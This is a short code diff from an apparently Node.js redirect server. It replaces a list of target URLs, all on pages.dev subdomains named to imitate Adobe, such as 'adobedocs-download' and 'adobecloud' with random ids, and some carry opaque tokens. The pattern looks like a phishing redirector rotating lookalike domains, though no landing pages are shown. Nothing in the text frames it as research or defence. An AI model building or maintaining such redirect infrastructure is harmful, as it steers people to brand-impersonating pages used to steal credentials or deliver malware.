@@ -5,9 +5,9 @@ const PORT = process.env.PORT || 3000; // Render assigns a PORT dynamically
 
 // List of URLs for redirection
 const urls = [
-    "https://main.adobedocs-download.pages.dev/?6jxin7p4u3xoo5f9nw6artiwe8cx647xk51qzi5uqu5dgrnqfpoj7gmj38257",
-    "https://7b3b46f2.adobedocs-download.pages.dev/?6jxin7p4u3xoo5f9nw6artiwe8cx647xk51qzi5uqu5dgrnqfpoj7gm3l8624",
-    "https://main.adobedocs-download.pages.dev/?6jxin7p4u3xoo5f9nw6artiwe8cx647xk51qzi5uqu5dgrnqfpoj7gmjl4528"
+    "https://main.adobecloud-f9a9511a-dbcb-420a-9a76-54dc5088bb30.pages.dev",
+    "https://main.adobecloud-f9a9511a-dbcb-420a-9a76-54dc5088bb30.pages.dev",
+    "https://3b412ab5.adobecloud-f9a9511a-dbcb-420a-9a76-54dc5088bb30.pages.dev"
 ];
 
 // Route to handle redirection
